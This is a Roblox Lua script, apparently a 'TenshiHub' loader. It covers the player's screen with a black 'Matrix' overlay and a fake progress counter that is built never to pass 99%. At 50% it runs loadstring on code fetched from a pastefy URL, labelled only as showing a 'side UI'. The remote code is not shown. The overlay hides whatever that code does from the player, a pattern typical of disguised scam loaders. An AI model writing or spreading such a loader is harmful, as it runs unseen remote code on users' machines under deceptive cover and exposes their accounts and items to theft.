repeat wait() until game:IsLoaded()
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

-- Create main screen GUI
local screenGui = Instance.new("ScreenGui", gui)
screenGui.Name = "TenshiHubLoading"
screenGui.ResetOnSpawn = false

-- Full black frame
local background = Instance.new("Frame", screenGui)
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.BorderSizePixel = 0

-- Matrix effect text
for i = 1, 100 do
	local text = Instance.new("TextLabel", background)
	text.Size = UDim2.new(0, math.random(30,50), 0, math.random(20, 30))
	text.Position = UDim2.new(math.random(), 0, math.random(), 0)
	text.BackgroundTransparency = 1
	text.TextColor3 = Color3.new(0, 1, 0)
	text.Font = Enum.Font.Code
	text.TextSize = 14
	text.Text = tostring(math.random(100000, 999999))
	coroutine.wrap(function()
		while screenGui.Parent do
			text.Text = tostring(math.random(100000, 999999))
			wait(math.random(0.2, 1))
		end
	end)()
end

-- Loading text label
local loadingLabel = Instance.new("TextLabel", background)
loadingLabel.Size = UDim2.new(0, 300, 0, 50)
loadingLabel.Position = UDim2.new(0.5, -150, 0.5, -25)
loadingLabel.BackgroundTransparency = 1
loadingLabel.TextColor3 = Color3.new(0, 1, 0)
loadingLabel.Font = Enum.Font.Code
loadingLabel.TextSize = 30
loadingLabel.Text = "Loading... 1%"

-- Notification (bottom-left)
local notify = Instance.new("TextLabel", screenGui)
notify.Size = UDim2.new(0, 300, 0, 30)
notify.Position = UDim2.new(0, 10, 1, -40)
notify.BackgroundTransparency = 0.5
notify.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
notify.TextColor3 = Color3.new(0, 1, 0)
notify.Font = Enum.Font.Code
notify.TextSize = 16
notify.Text = "[TenshiHub] Loading UI..."
notify.Visible = true

-- Simulate loading
spawn(function()
	for i = 1, 99 do
		loadingLabel.Text = "Loading... " .. i .. "%"
		wait(1.2) -- 1.2s for each increment = ~2 minutes total
		if i == 50 then
			-- Show side UI at 50%
			loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()
		end
	end
	loadingLabel.Text = "Loading... 99%"
	-- Do not proceed to 100%
end)
